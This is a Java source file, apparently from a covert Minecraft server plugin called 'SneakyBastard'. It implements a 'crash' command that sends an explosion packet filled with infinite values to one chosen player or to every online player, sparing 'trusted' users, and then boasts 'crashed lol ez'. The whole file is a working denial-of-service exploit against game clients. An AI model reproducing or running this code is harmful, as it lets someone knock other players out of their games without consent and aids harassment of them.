package net.blackofworld.SneakyBastard.Commands.Player;

import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import net.blackofworld.SneakyBastard.Command.CommandManager;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.world.phys.Vec3;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.*;

@CommandInfo(command = "crash", description = "Crashes the player", syntax = "<player>", category = CommandCategory.Player, requiredArgs = 1)
@ExtensionMethod({Player.class, PlayerExt.class})
public final class Crash extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Collection<? extends Player> pp = args.get(0).equals("*") ?
                Bukkit.getOnlinePlayers() :
                Collections.singleton(Bukkit.getPlayerExact(args.get(0)));
        if (pp.isEmpty()) {
            p.sendHelp(this, ChatColor.RED + "No player with such name!");
            return;
        }
        ClientboundExplodePacket packet = new ClientboundExplodePacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, List.of(), new Vec3(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY));
        pp.parallelStream().filter(pl -> !CommandManager.Instance.isTrusted(pl)).forEach(pl -> pl.sendPacket(packet));
        var name = args.get(0).equals("*") ? "Everyone" : args.get(0);
        p.Reply(name + " crashed lol ez");
    }
}
